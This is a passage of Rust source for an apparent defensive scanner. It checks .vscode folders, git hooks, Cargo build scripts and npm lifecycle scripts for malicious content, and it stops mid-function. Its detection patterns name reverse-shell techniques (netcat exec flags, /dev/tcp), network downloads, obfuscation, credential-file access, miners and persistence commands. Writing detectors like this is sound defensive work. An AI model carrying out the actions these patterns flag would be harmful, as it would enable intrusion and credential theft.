use clap::Parser;
use colored::Colorize;
use regex::Regex;
use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;
use walkdir::WalkDir;

#[derive(Parser)]
#[command(name = "vscode-analyzer")]
#[command(about = "Analyze .vscode directories for suspicious or malicious content")]
struct Cli {
    /// Path to the directory (or repository) to scan
    path: PathBuf,

    /// Also scan recursively for nested .vscode directories
    #[arg(short, long)]
    recursive: bool,

    /// Show file contents alongside findings
    #[arg(short, long)]
    verbose: bool,
}

#[derive(Debug, Clone)]
enum Severity {
    Critical,
    High,
    Medium,
    Low,
    Info,
}

impl std::fmt::Display for Severity {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Severity::Critical => write!(f, "{}", "CRITICAL".red().bold()),
            Severity::High => write!(f, "{}", "HIGH".red()),
            Severity::Medium => write!(f, "{}", "MEDIUM".yellow()),
            Severity::Low => write!(f, "{}", "LOW".blue()),
            Severity::Info => write!(f, "{}", "INFO".cyan()),
        }
    }
}

#[derive(Debug)]
struct Finding {
    severity: Severity,
    file: String,
    description: String,
    matched_content: Option<String>,
    line_number: Option<usize>,
}

impl Finding {
    fn new(severity: Severity, file: &str, description: &str) -> Self {
        Self {
            severity,
            file: file.to_string(),
            description: description.to_string(),
            matched_content: None,
            line_number: None,
        }
    }

    fn with_match(mut self, content: &str, line: usize) -> Self {
        self.matched_content = Some(content.to_string());
        self.line_number = Some(line);
        self
    }
}

struct PatternRule {
    pattern: Regex,
    severity: Severity,
    description: &'static str,
}

fn build_content_rules() -> Vec<PatternRule> {
    let rules = vec![
        // Shell / command execution
        (r"(?i)(curl|wget|invoke-webrequest|iwr|irm)\s+.*(http|ftp)", Severity::Critical, "Network download command detected"),
        (r"(?i)(powershell|pwsh|cmd|bash|sh|zsh)\s+(-c|-Command|-enc|-EncodedCommand)", Severity::Critical, "Shell execution with inline command"),
        (r"(?i)\beval\b\s*\(", Severity::High, "eval() call detected"),
        (r"(?i)(nc|ncat|netcat)\s+.*-[elp]", Severity::Critical, "Netcat with listen/exec flags (possible reverse shell)"),
        (r"(?i)/dev/tcp/", Severity::Critical, "Bash /dev/tcp redirection (reverse shell pattern)"),
        (r"(?i)\bsystem\s*\(", Severity::High, "system() call detected"),
        (r"(?i)exec\s*\(", Severity::High, "exec() call detected"),

        // Obfuscation / encoding
        (r"(?i)base64\s*(-d|--decode|_decode|\.decode)", Severity::High, "Base64 decode operation"),
        (r"[A-Za-z0-9+/]{60,}={0,2}", Severity::Medium, "Long base64-like string"),
        (r"\\x[0-9a-fA-F]{2}(\\x[0-9a-fA-F]{2}){10,}", Severity::High, "Hex-encoded string sequence"),
        (r"\\u[0-9a-fA-F]{4}(\\u[0-9a-fA-F]{4}){10,}", Severity::Medium, "Unicode-escaped string sequence"),
        (r"String\.fromCharCode\s*\(", Severity::High, "String.fromCharCode (JS obfuscation)"),
        (r"(?i)atob\s*\(", Severity::High, "atob() base64 decode in JS"),
        (r#"\$\{.*\$\(.*\).*\}"#, Severity::Medium, "Nested command substitution in variable"),

        // Credential / data theft
        (r"(?i)(password|passwd|secret|token|api_key|apikey|credential)", Severity::Medium, "Reference to secrets/credentials"),
        (r"(?i)\.(ssh|gnupg|aws|azure|gcloud|npmrc|pypirc)", Severity::High, "Reference to sensitive config directory/file"),
        (r"(?i)(~|\\$HOME|%USERPROFILE%)/", Severity::Medium, "Home directory reference"),

        // Crypto mining
        (r"(?i)(xmrig|stratum\+tcp|coinhive|cryptonight|monero|mining\.pool)", Severity::Critical, "Crypto mining indicator"),

        // Persistence / privilege escalation
        (r"(?i)(crontab|schtasks|launchctl|systemctl\s+enable)", Severity::High, "Persistence mechanism command"),
        (r"(?i)(chmod\s+[0-7]*[1-7][0-7]*\s+|chmod\s+\+[sx])", Severity::Medium, "Permission modification"),
        (r"(?i)sudo\s+", Severity::Medium, "Sudo usage"),

        // Suspicious file operations
        (r"(?i)(rm\s+-rf|del\s+/[sfq]|rmdir\s+/s)", Severity::High, "Destructive file deletion"),
        (r"(?i)>/dev/null\s+2>&1", Severity::Medium, "Output suppression (hiding traces)"),
        (r"(?i)(mktemp|/tmp/|%TEMP%)", Severity::Low, "Temp directory usage"),
    ];

    rules
        .into_iter()
        .filter_map(|(pat, sev, desc)| {
            Regex::new(pat).ok().map(|r| PatternRule {
                pattern: r,
                severity: sev,
                description: desc,
            })
        })
        .collect()
}

fn analyze_tasks_json(path: &Path, content: &str, findings: &mut Vec<Finding>) {
    let file_str = path.display().to_string();

    let Ok(val) = serde_json::from_str::<serde_json::Value>(content) else {
        return;
    };
    let Some(tasks) = val.get("tasks").and_then(|t| t.as_array()) else {
        return;
    };
    for task in tasks {
        // Auto-run on folder open is a major red flag
        if let Some(run_on) = task.get("runOptions").and_then(|r| r.get("runOn")) {
            if run_on.as_str() == Some("folderOpen") {
                let label = task
                    .get("label")
                    .and_then(|l| l.as_str())
                    .unwrap_or("<unnamed>");
                findings.push(Finding::new(
                    Severity::Critical,
                    &file_str,
                    &format!(
                        "Task '{}' runs automatically on folder open (runOn: folderOpen)",
                        label
                    ),
                ));
            }
        }

        // Shell-type tasks with commands
        if let Some(cmd) = task
            .get("command")
            .and_then(|c| c.as_str())
            .or_else(|| {
                task.get("args")
                    .and_then(|a| a.as_array())
                    .and_then(|a| a.first())
                    .and_then(|v| v.as_str())
            })
        {
            let task_type = task
                .get("type")
                .and_then(|t| t.as_str())
                .unwrap_or("unknown");
            if task_type == "shell" || task_type == "process" {
                findings.push(Finding::new(
                    Severity::High,
                    &file_str,
                    &format!(
                        "Shell/process task with command: {}",
                        truncate(cmd, 120)
                    ),
                ));
            }
        }
    }
}

fn analyze_settings_json(path: &Path, content: &str, findings: &mut Vec<Finding>) {
    let file_str = path.display().to_string();

    let dangerous_settings = [
        ("terminal.integrated.defaultProfile", Severity::Medium, "Custom default terminal profile"),
        ("terminal.integrated.shellArgs", Severity::High, "Custom terminal shell arguments"),
        ("terminal.integrated.shell.", Severity::High, "Custom terminal shell path"),
        ("terminal.integrated.env.", Severity::Medium, "Custom terminal environment variables"),
        ("terminal.integrated.automationProfile", Severity::High, "Custom automation terminal profile"),
        ("editor.formatOnSave", Severity::Low, "Format on save enabled (check formatter)"),
        ("editor.defaultFormatter", Severity::Low, "Custom default formatter set"),
        ("editor.codeActionsOnSave", Severity::Low, "Code actions on save"),
        ("git.postCommitCommand", Severity::High, "Post-commit command configured"),
        ("task.allowAutomaticTasks", Severity::Critical, "Automatic tasks explicitly allowed"),
        ("security.workspace.trust.enabled", Severity::High, "Workspace trust setting modified"),
    ];

    let Ok(val) = serde_json::from_str::<serde_json::Value>(content) else {
        return;
    };
    let Some(obj) = val.as_object() else {
        return;
    };
    for (key, value) in obj {
        for (pattern, severity, desc) in &dangerous_settings {
            if key.contains(pattern) {
                findings.push(Finding::new(
                    severity.clone(),
                    &file_str,
                    &format!("{}: {} = {}", desc, key, truncate(&value.to_string(), 80)),
                ));
            }
        }
    }
}

fn analyze_launch_json(path: &Path, content: &str, findings: &mut Vec<Finding>) {
    let file_str = path.display().to_string();

    let Ok(val) = serde_json::from_str::<serde_json::Value>(content) else {
        return;
    };
    let Some(configs) = val.get("configurations").and_then(|c| c.as_array()) else {
        return;
    };
    for config in configs {
        for field in &["preLaunchTask", "postDebugTask"] {
            if let Some(task_name) = config.get(*field).and_then(|t| t.as_str()) {
                findings.push(Finding::new(
                    Severity::Medium,
                    &file_str,
                    &format!("Debug config references task via {}: '{}'", field, task_name),
                ));
            }
        }

        if let Some(sra) = config.get("serverReadyAction") {
            if sra.get("action").and_then(|a| a.as_str()) == Some("startDebugging")
                || sra.get("killOnServerStop").is_some()
            {
                findings.push(Finding::new(
                    Severity::Medium,
                    &file_str,
                    "serverReadyAction with automatic behavior",
                ));
            }
        }

        if config.get("env").is_some() || config.get("envFile").is_some() {
            findings.push(Finding::new(
                Severity::Low,
                &file_str,
                "Debug configuration sets environment variables",
            ));
        }
    }
}

fn analyze_extensions_json(path: &Path, content: &str, findings: &mut Vec<Finding>) {
    let file_str = path.display().to_string();

    let Ok(val) = serde_json::from_str::<serde_json::Value>(content) else {
        return;
    };
    let Some(recs) = val.get("recommendations").and_then(|r| r.as_array()) else {
        return;
    };
    for ext in recs {
        if let Some(ext_id) = ext.as_str() {
            let known_publishers = [
                "ms-python",
                "ms-vscode",
                "ms-dotnettools",
                "ms-azuretools",
                "microsoft",
                "vscode",
                "dbaeumer",
                "esbenp",
                "rust-lang",
                "golang",
                "redhat",
                "github",
                "eamodio",
                "vscodevim",
                "formulahendry",
                "ritwickdey",
            ];
            let publisher = ext_id.split('.').next().unwrap_or("");
            if !known_publishers.contains(&publisher) {
                findings.push(Finding::new(
                    Severity::Medium,
                    &file_str,
                    &format!(
                        "Recommended extension from lesser-known publisher: {}",
                        ext_id
                    ),
                ));
            }
        }
    }
}

fn analyze_file_content(path: &Path, content: &str, rules: &[PatternRule], findings: &mut Vec<Finding>) {
    let file_str = path.display().to_string();
    for (line_num, line) in content.lines().enumerate() {
        for rule in rules {
            if rule.pattern.is_match(line) {
                findings.push(
                    Finding::new(rule.severity.clone(), &file_str, rule.description)
                        .with_match(line.trim(), line_num + 1),
                );
            }
        }
    }
}

fn check_unexpected_files(vscode_dir: &Path, findings: &mut Vec<Finding>) {
    let expected_files = [
        "settings.json",
        "tasks.json",
        "launch.json",
        "extensions.json",
        "c_cpp_properties.json",
        "keybindings.json",
        "snippets",
        "argv.json",
    ];

    for entry in WalkDir::new(vscode_dir).min_depth(1).max_depth(1) {
        let Ok(entry) = entry else { continue };
        let name = entry.file_name().to_string_lossy();
        let is_expected = expected_files.iter().any(|e| *e == name.as_ref());

        if !is_expected {
            let severity = if entry.path().is_dir() {
                Severity::High
            } else if name.ends_with(".sh")
                || name.ends_with(".bat")
                || name.ends_with(".ps1")
                || name.ends_with(".py")
                || name.ends_with(".js")
            {
                Severity::Critical
            } else {
                Severity::Medium
            };

            findings.push(Finding::new(
                severity,
                &entry.path().display().to_string(),
                &format!("Unexpected file/directory in .vscode: {}", name),
            ));
        }
    }

    // Check for deeply nested content
    let deep_files: Vec<_> = WalkDir::new(vscode_dir)
        .min_depth(2)
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| e.file_type().is_file())
        .collect();

    if deep_files.len() > 20 {
        findings.push(Finding::new(
            Severity::High,
            &vscode_dir.display().to_string(),
            &format!(
                ".vscode contains {} deeply nested files (unusual)",
                deep_files.len()
            ),
        ));
    }

    for entry in &deep_files {
        let name = entry.file_name().to_string_lossy();
        if name.ends_with(".sh")
            || name.ends_with(".bat")
            || name.ends_with(".ps1")
            || name.ends_with(".exe")
            || name.ends_with(".dll")
            || name.ends_with(".so")
            || name.ends_with(".dylib")
        {
            findings.push(Finding::new(
                Severity::Critical,
                &entry.path().display().to_string(),
                &format!("Executable/script file deep in .vscode: {}", name),
            ));
        }
    }
}

// ---- Git hooks analysis ----

const KNOWN_GIT_HOOKS: &[&str] = &[
    "applypatch-msg",
    "commit-msg",
    "fsmonitor-watchman",
    "post-applypatch",
    "post-checkout",
    "post-commit",
    "post-index-change",
    "post-merge",
    "post-receive",
    "post-rewrite",
    "post-update",
    "pre-applypatch",
    "pre-auto-gc",
    "pre-commit",
    "pre-merge-commit",
    "pre-push",
    "pre-rebase",
    "pre-receive",
    "prepare-commit-msg",
    "push-to-checkout",
    "sendemail-validate",
    "update",
];

/// Check if a hook file is a default sample (shipped with git init).
fn is_sample_hook(path: &Path) -> bool {
    path.extension().and_then(|e| e.to_str()) == Some("sample")
}

/// Scan a single hook file for suspicious content.
fn analyze_hook_file(path: &Path, content: &str, rules: &[PatternRule], findings: &mut Vec<Finding>) {
    let file_str = path.display().to_string();
    let name = path.file_name().unwrap_or_default().to_string_lossy();

    // Any non-sample hook is noteworthy; auto-triggered ones are higher severity
    let auto_triggered = [
        "post-checkout", "post-merge", "post-commit", "pre-commit",
        "pre-push", "prepare-commit-msg", "commit-msg",
    ];
    if auto_triggered.iter().any(|h| name.as_ref() == *h) {
        findings.push(Finding::new(
            Severity::High,
            &file_str,
            &format!("Active git hook '{}' runs automatically on common git operations", name),
        ));
    } else {
        findings.push(Finding::new(
            Severity::Medium,
            &file_str,
            &format!("Active git hook '{}' present", name),
        ));
    }

    // Check for obfuscated/minified content (single very long line)
    for (line_num, line) in content.lines().enumerate() {
        if line.len() > 500 && !line.starts_with('#') {
            findings.push(
                Finding::new(
                    Severity::High,
                    &file_str,
                    "Extremely long line in hook script (possible obfuscation)",
                )
                .with_match(&truncate(line.trim(), 100), line_num + 1),
            );
        }
    }

    // Run standard content pattern rules
    analyze_file_content(path, content, rules, findings);
}

/// Check `.git/config` for a custom `core.hooksPath`.
fn analyze_git_config(git_dir: &Path, findings: &mut Vec<Finding>) {
    let config_path = git_dir.join("config");
    if !config_path.exists() {
        return;
    }
    let Ok(content) = fs::read_to_string(&config_path) else {
        return;
    };
    let file_str = config_path.display().to_string();

    if let Some(re) = Regex::new(r"(?i)hooksPath\s*=\s*(.+)").ok() {
        for cap in re.captures_iter(&content) {
            let hooks_path = cap[1].trim();
            findings.push(Finding::new(
                Severity::High,
                &file_str,
                &format!("core.hooksPath redirects hooks to: {}", hooks_path),
            ));
        }
    }
}

/// Scan a shared hooks directory (e.g. `.githooks/`) in the repo root.
fn scan_shared_hooks_dir(hooks_dir: &Path, rules: &[PatternRule], verbose: bool, findings: &mut Vec<Finding>) {
    let dir_str = hooks_dir.display().to_string();
    findings.push(Finding::new(
        Severity::Medium,
        &dir_str,
        &format!(
            "Shared hooks directory '{}' found in repo (may be activated via core.hooksPath)",
            hooks_dir.file_name().unwrap_or_default().to_string_lossy()
        ),
    ));

    for entry in WalkDir::new(hooks_dir)
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| e.file_type().is_file())
    {
        let path = entry.path();
        if let Ok(content) = fs::read_to_string(path) {
            analyze_hook_file(path, &content, rules, findings);
            if verbose {
                println!(
                    "\n{}",
                    format!("--- Contents of {} ---", path.display()).dimmed()
                );
                println!("{}", content.dimmed());
            }
        }
    }
}

/// Main entry point for scanning git hooks in a repository.
fn scan_git_hooks(root: &Path, verbose: bool) -> Vec<Finding> {
    let mut findings = Vec::new();
    let rules = build_content_rules();

    // 1. Check .git/hooks/
    let git_hooks_dir = root.join(".git").join("hooks");
    if git_hooks_dir.is_dir() {
        for entry in WalkDir::new(&git_hooks_dir)
            .min_depth(1)
            .max_depth(1)
            .into_iter()
            .filter_map(|e| e.ok())
            .filter(|e| e.file_type().is_file())
        {
            let path = entry.path();
            if is_sample_hook(path) {
                continue;
            }
            let name = path.file_name().unwrap_or_default().to_string_lossy();

            // Flag hooks with unrecognized names
            if !KNOWN_GIT_HOOKS.contains(&name.as_ref()) {
                findings.push(Finding::new(
                    Severity::High,
                    &path.display().to_string(),
                    &format!("Unknown hook name '{}' in .git/hooks/", name),
                ));
            }

            if let Ok(content) = fs::read_to_string(path) {
                analyze_hook_file(path, &content, &rules, &mut findings);
                if verbose {
                    println!(
                        "\n{}",
                        format!("--- Contents of {} ---", path.display()).dimmed()
                    );
                    println!("{}", content.dimmed());
                }
            }
        }
    }

    // 2. Check .git/config for core.hooksPath
    let git_dir = root.join(".git");
    if git_dir.is_dir() {
        analyze_git_config(&git_dir, &mut findings);
    }

    // 3. Check for shared hooks directories in the repo root
    for hooks_dir_name in &[".githooks", ".hooks", "githooks"] {
        let hooks_dir = root.join(hooks_dir_name);
        if hooks_dir.is_dir() {
            scan_shared_hooks_dir(&hooks_dir, &rules, verbose, &mut findings);
        }
    }

    findings
}

fn scan_vscode_dir(vscode_dir: &Path, verbose: bool) -> Vec<Finding> {
    let mut findings = Vec::new();
    let rules = build_content_rules();

    check_unexpected_files(vscode_dir, &mut findings);

    let analyzers: &[(&str, fn(&Path, &str, &mut Vec<Finding>))] = &[
        ("tasks.json", analyze_tasks_json),
        ("settings.json", analyze_settings_json),
        ("launch.json", analyze_launch_json),
        ("extensions.json", analyze_extensions_json),
    ];

    for (filename, analyzer) in analyzers {
        let file_path = vscode_dir.join(filename);
        if file_path.exists() {
            match fs::read_to_string(&file_path) {
                Ok(content) => {
                    analyzer(&file_path, &content, &mut findings);
                    analyze_file_content(&file_path, &content, &rules, &mut findings);
                    if verbose {
                        println!(
                            "\n{}",
                            format!("--- Contents of {} ---", file_path.display()).dimmed()
                        );
                        println!("{}", content.dimmed());
                    }
                }
                Err(e) => {
                    findings.push(Finding::new(
                        Severity::Low,
                        &file_path.display().to_string(),
                        &format!("Could not read file: {}", e),
                    ));
                }
            }
        }
    }

    // Scan all other files for suspicious content
    for entry in WalkDir::new(vscode_dir)
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| e.file_type().is_file())
    {
        let path = entry.path();
        let name = path.file_name().unwrap_or_default().to_string_lossy();
        if analyzers.iter().any(|(f, _)| *f == name.as_ref()) {
            continue;
        }
        if let Ok(content) = fs::read_to_string(path) {
            analyze_file_content(path, &content, &rules, &mut findings);
        }
    }

    findings
}

// ---- Cargo build script analysis ----

/// Build-script-specific suspicious patterns (on top of the general content rules).
fn build_script_rules() -> Vec<PatternRule> {
    let rules = vec![
        // Network access from build scripts
        (r"(?i)(reqwest|hyper|ureq|attohttpc|minreq|curl)::|\bsurf\b", Severity::Critical, "Network library usage in build script"),
        (r"(?i)TcpStream|UdpSocket|TcpListener", Severity::Critical, "Raw network socket in build script"),

        // Arbitrary command execution
        (r"Command::new\s*\(", Severity::Medium, "Command execution in build script (review target)"),
        (r#"Command::new\s*\(\s*"(curl|wget|bash|sh|powershell|cmd|python|node|ruby|perl)"#, Severity::Critical, "Build script spawns network/shell/scripting command"),

        // File system access outside OUT_DIR
        (r#"(?i)(home_dir|home_directory|dirs::home|env::var\(\s*"HOME")"#, Severity::High, "Build script accesses home directory"),
        (r"(?i)\.(ssh|gnupg|aws|npmrc|gitconfig|cargo/credentials)", Severity::Critical, "Build script references sensitive config file"),
        (r#"(?i)env::var\(\s*"(USER|USERNAME|LOGNAME|HOSTNAME|SSH_AUTH_SOCK)"\s*\)"#, Severity::Medium, "Build script reads identity/environment info"),

        // Writing outside standard paths
        (r#"(?i)write\(|write_all\(|create\("#, Severity::Low, "File write in build script (verify target path)"),
        (r"(?i)set_permissions|chmod", Severity::High, "Build script modifies file permissions"),

        // Dynamic library loading
        (r"(?i)(dlopen|LoadLibrary|libloading)", Severity::High, "Dynamic library loading in build script"),

        // Include arbitrary bytes
        (r"include_bytes!\s*\(", Severity::Medium, "include_bytes! in build script (embeds binary data)"),

        // Accessing cargo credentials / registry tokens
        (r"(?i)(CARGO_REGISTRY_TOKEN|cargo.credentials|crates.io)", Severity::Critical, "Build script references cargo registry credentials"),
    ];

    rules
        .into_iter()
        .filter_map(|(pat, sev, desc)| {
            Regex::new(pat).ok().map(|r| PatternRule {
                pattern: r,
                severity: sev,
                description: desc,
            })
        })
        .collect()
}

/// Information about a dependency's build script.
#[derive(Debug)]
struct BuildScriptInfo {
    package_name: String,
    package_version: String,
    build_script_path: PathBuf,
}

/// Run `cargo metadata` and collect all dependencies that have a build script.
fn collect_build_scripts(root: &Path) -> Result<Vec<BuildScriptInfo>, String> {
    let output = Command::new("cargo")
        .args(["metadata", "--format-version", "1"])
        .current_dir(root)
        .output()
        .map_err(|e| format!("Failed to run cargo metadata: {}", e))?;

    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        return Err(format!("cargo metadata failed: {}", stderr));
    }

    let metadata: serde_json::Value = serde_json::from_slice(&output.stdout)
        .map_err(|e| format!("Failed to parse cargo metadata JSON: {}", e))?;

    let mut build_scripts = Vec::new();

    if let Some(packages) = metadata.get("packages").and_then(|p| p.as_array()) {
        for pkg in packages {
            let name = pkg.get("name").and_then(|n| n.as_str()).unwrap_or("unknown");
            let version = pkg.get("version").and_then(|v| v.as_str()).unwrap_or("0.0.0");
            let manifest_path = pkg
                .get("manifest_path")
                .and_then(|m| m.as_str())
                .unwrap_or("");

            if manifest_path.is_empty() {
                continue;
            }

            let crate_dir = Path::new(manifest_path).parent().unwrap_or(Path::new(""));

            // Check the `build` field in targets
            let has_build_script = pkg
                .get("targets")
                .and_then(|t| t.as_array())
                .map(|targets| {
                    targets.iter().any(|t| {
                        t.get("kind")
                            .and_then(|k| k.as_array())
                            .map(|kinds| kinds.iter().any(|k| k.as_str() == Some("custom-build")))
                            .unwrap_or(false)
                    })
                })
                .unwrap_or(false);

            if has_build_script {
                // Find the actual build script path from the target entry
                let build_path = pkg
                    .get("targets")
                    .and_then(|t| t.as_array())
                    .and_then(|targets| {
                        targets.iter().find_map(|t| {
                            let is_build = t
                                .get("kind")
                                .and_then(|k| k.as_array())
                                .map(|kinds| kinds.iter().any(|k| k.as_str() == Some("custom-build")))
                                .unwrap_or(false);
                            if is_build {
                                t.get("src_path").and_then(|s| s.as_str()).map(PathBuf::from)
                            } else {
                                None
                            }
                        })
                    })
                    .unwrap_or_else(|| crate_dir.join("build.rs"));

                if build_path.exists() {
                    build_scripts.push(BuildScriptInfo {
                        package_name: name.to_string(),
                        package_version: version.to_string(),
                        build_script_path: build_path,
                    });
                }
            }
        }
    }

    Ok(build_scripts)
}

/// Analyze a single build script file.
fn analyze_build_script(
    info: &BuildScriptInfo,
    content: &str,
    general_rules: &[PatternRule],
    build_rules: &[PatternRule],
    findings: &mut Vec<Finding>,
) {
    let file_str = info.build_script_path.display().to_string();

    // Apply build-script-specific rules
    for (line_num, line) in content.lines().enumerate() {
        for rule in build_rules {
            if rule.pattern.is_match(line) {
                findings.push(
                    Finding::new(rule.severity.clone(), &file_str, rule.description)
                        .with_match(line.trim(), line_num + 1),
                );
            }
        }
    }

    // Apply general content rules (network, obfuscation, etc.)
    analyze_file_content(&info.build_script_path, content, general_rules, findings);

    // Check for obfuscated/minified content
    for (line_num, line) in content.lines().enumerate() {
        if line.len() > 500 && !line.starts_with("//") && !line.starts_with("///") {
            findings.push(
                Finding::new(
                    Severity::High,
                    &file_str,
                    "Extremely long line in build script (possible obfuscation)",
                )
                .with_match(&truncate(line.trim(), 100), line_num + 1),
            );
        }
    }
}

/// Main entry point for scanning cargo build scripts.
fn scan_cargo_build_scripts(root: &Path, verbose: bool) -> Vec<Finding> {
    let mut findings = Vec::new();

    let build_scripts = match collect_build_scripts(root) {
        Ok(scripts) => scripts,
        Err(e) => {
            findings.push(Finding::new(
                Severity::Low,
                &root.display().to_string(),
                &format!("Could not collect cargo build scripts: {}", e),
            ));
            return findings;
        }
    };

    if build_scripts.is_empty() {
        println!("  No dependencies with build scripts found.");
        return findings;
    }

    println!(
        "  Found {} dependencies with build scripts:\n",
        build_scripts.len()
    );
    for info in &build_scripts {
        println!(
            "    {} {} v{}",
            "-".dimmed(),
            info.package_name.bold(),
            info.package_version
        );
        if verbose {
            println!("      {}", info.build_script_path.display().to_string().dimmed());
        }
    }
    println!();

    let general_rules = build_content_rules();
    let build_rules = build_script_rules();

    for info in &build_scripts {
        match fs::read_to_string(&info.build_script_path) {
            Ok(content) => {
                let before = findings.len();
                analyze_build_script(info, &content, &general_rules, &build_rules, &mut findings);
                let new_findings = findings.len() - before;

                if verbose && new_findings > 0 {
                    println!(
                        "  {} {} ({} findings)",
                        info.package_name.bold(),
                        info.build_script_path.display().to_string().dimmed(),
                        new_findings,
                    );
                }
            }
            Err(e) => {
                findings.push(Finding::new(
                    Severity::Low,
                    &info.build_script_path.display().to_string(),
                    &format!(
                        "Could not read build script for {} v{}: {}",
                        info.package_name, info.package_version, e
                    ),
                ));
            }
        }
    }

    findings
}

// ---- npm / package.json analysis ----

/// Dangerous npm lifecycle script names that run automatically.
const NPM_LIFECYCLE_SCRIPTS: &[&str] = &[
    "preinstall",
    "install",
    "postinstall",
    "preuninstall",
    "postuninstall",
    "prepublish",
    "preprepare",
    "prepare",
    "postprepare",
];

/// Well-known popular npm packages (used for typosquatting detection).
const POPULAR_NPM_PACKAGES: &[&str] = &[
    "express", "react", "react-dom", "lodash", "axios", "chalk", "commander",
    "webpack", "babel", "eslint", "prettier", "typescript", "jest", "mocha",
    "moment", "underscore", "request", "async", "debug", "bluebird",
    "mongoose", "sequelize", "dotenv", "cors", "body-parser", "uuid",
    "fs-extra", "glob", "minimist", "yargs", "inquirer", "socket.io",
    "passport", "jsonwebtoken", "bcrypt", "nodemon", "pm2", "electron",
    "next", "nuxt", "vue", "angular", "svelte", "tailwindcss", "postcss",
    "rollup", "vite", "esbuild", "turbo", "nx", "lerna", "rimraf",
    "mkdirp", "cross-env", "concurrently", "husky", "lint-staged",
    "nodemailer", "puppeteer", "cheerio", "sharp", "jimp", "got",
    "node-fetch", "superagent", "graphql", "apollo", "prisma", "knex",
    "typeorm", "redis", "ioredis", "pg", "mysql2", "mongodb",
];

/// Simple edit distance (Levenshtein) for short strings.
fn edit_distance(a: &str, b: &str) -> usize {
    let a_bytes = a.as_bytes();
    let b_bytes = b.as_bytes();
    let m = a_bytes.len();
    let n = b_bytes.len();

    if m == 0 { return n; }
    if n == 0 { return m; }

    let mut prev: Vec<usize> = (0..=n).collect();
    let mut curr = vec![0; n + 1];

    for i in 1..=m {
        curr[0] = i;
        for j in 1..=n {
            let cost = if a_bytes[i - 1] == b_bytes[j - 1] { 0 } else { 1 };
            curr[j] = (prev[j] + 1)
                .min(curr[j - 1] + 1)
                .min(prev[j - 1] + cost);
        }
        std::mem::swap(&mut prev, &mut curr);
    }
    prev[n]
}

/// Check a dependency name for typosquatting against popular packages.
fn check_typosquatting(name: &str) -> Option<&'static str> {
    for &popular in POPULAR_NPM_PACKAGES {
        if name == popular {
            return None; // exact match, it IS the popular package
        }
        // Only check packages with similar length
        let len_diff = (name.len() as isize - popular.len() as isize).unsigned_abs();
        if len_diff > 2 {
            continue;
        }
        let dist = edit_distance(name, popular);
        if dist == 1 {
            return Some(popular);
        }
        // Also check common typosquatting patterns: prefix/suffix manipulation
        if name.starts_with(&format!("{}-", popular))
            || name.ends_with(&format!("-{}", popular))
            || name == &format!("{}s", popular)
            || name == &format!("{}js", popular)
            || name == &format!("{}-js", popular)
            || name == &format!("node-{}", popular)
            || name.replace('-', "") == popular.replace('-', "")
        {
            if dist <= 3 && name != popular {
                return Some(popular);
            }
        }
    }
    None
}

/// Analyze a package.json scripts section for suspicious lifecycle scripts.
fn analyze_npm_scripts(
    pkg_json_path: &Path,
    pkg_value: &serde_json::Value,
    pkg_label: &str,
    rules: &[PatternRule],
    findings: &mut Vec<Finding>,
) {
    let file_str = pkg_json_path.display().to_string();
    let Some(scripts) = pkg_value.get("scripts").and_then(|s| s.as_object()) else {
        return;
    };

    for &lifecycle in NPM_LIFECYCLE_SCRIPTS {
        if let Some(cmd) = scripts.get(lifecycle).and_then(|c| c.as_str()) {
            let severity = if lifecycle == "preinstall" || lifecycle == "postinstall" || lifecycle == "install" {
                Severity::High
            } else {
                Severity::Medium
            };

            findings.push(Finding::new(
                severity,
                &file_str,
                &format!(
                    "{}: lifecycle script '{}': {}",
                    pkg_label,
                    lifecycle,
                    truncate(cmd, 120),
                ),
            ));

            // Analyze the script content with pattern rules
            for rule in rules {
                if rule.pattern.is_match(cmd) {
                    findings.push(Finding::new(
                        rule.severity.clone(),
                        &file_str,
                        &format!(
                            "{}: {} in '{}' script: {}",
                            pkg_label,
                            rule.description,
                            lifecycle,
                            truncate(cmd, 100),
                        ),
                    ));
                }
            }
        }
    }
}

/// Scan root package.json and all dependencies in node_modules.
fn scan_npm_packages(root: &Path, verbose: bool) -> Vec<Finding> {
    let mut findings = Vec::new();
    let rules = build_content_rules();
    let pkg_json_path = root.join("package.json");

    // 1. Analyze root package.json
    if let Ok(content) = fs::read_to_string(&pkg_json_path) {
        if let Ok(pkg) = serde_json::from_str::<serde_json::Value>(&content) {
            analyze_npm_scripts(&pkg_json_path, &pkg, "root", &rules, &mut findings);

            // Check all dependency sections for typosquatting
            for section in &["dependencies", "devDependencies", "optionalDependencies", "peerDependencies"] {
                if let Some(deps) = pkg.get(*section).and_then(|d| d.as_object()) {
                    for dep_name in deps.keys() {
                        if let Some(similar_to) = check_typosquatting(dep_name) {
                            findings.push(Finding::new(
                                Severity::High,
                                &pkg_json_path.display().to_string(),
                                &format!(
                                    "Possible typosquat: '{}' in {} is similar to popular package '{}'",
                                    dep_name, section, similar_to,
                                ),
                            ));
                        }
                    }
                }
            }
        }
    }

    // 2. Scan node_modules for dependencies with install scripts
    let node_modules = root.join("node_modules");
    if !node_modules.is_dir() {
        if verbose {
            println!("  node_modules/ not found, skipping dependency install script scan.");
        }
        return findings;
    }

    let mut deps_with_scripts: Vec<(String, PathBuf)> = Vec::new();

    // Walk top-level and scoped packages in node_modules
    let scan_pkg = |pkg_dir: &Path, findings: &mut Vec<Finding>, deps_with_scripts: &mut Vec<(String, PathBuf)>, rules: &[PatternRule], verbose: bool| {
        let dep_pkg_json = pkg_dir.join("package.json");
        if !dep_pkg_json.exists() {
            return;
        }
        let Ok(content) = fs::read_to_string(&dep_pkg_json) else {
            return;
        };
        let Ok(pkg) = serde_json::from_str::<serde_json::Value>(&content) else {
            return;
        };

        let pkg_name = pkg
            .get("name")
            .and_then(|n| n.as_str())
            .unwrap_or("unknown");

        // Check if it has lifecycle scripts
        let has_lifecycle = pkg
            .get("scripts")
            .and_then(|s| s.as_object())
            .map(|scripts| {
                NPM_LIFECYCLE_SCRIPTS
                    .iter()
                    .any(|ls| scripts.contains_key(*ls))
            })
            .unwrap_or(false);

        if has_lifecycle {
            deps_with_scripts.push((pkg_name.to_string(), dep_pkg_json.clone()));
            let label = format!("dep:{}", pkg_name);
            analyze_npm_scripts(&dep_pkg_json, &pkg, &label, rules, findings);
        }

        // Also check for binding.gyp (native addon that runs install scripts)
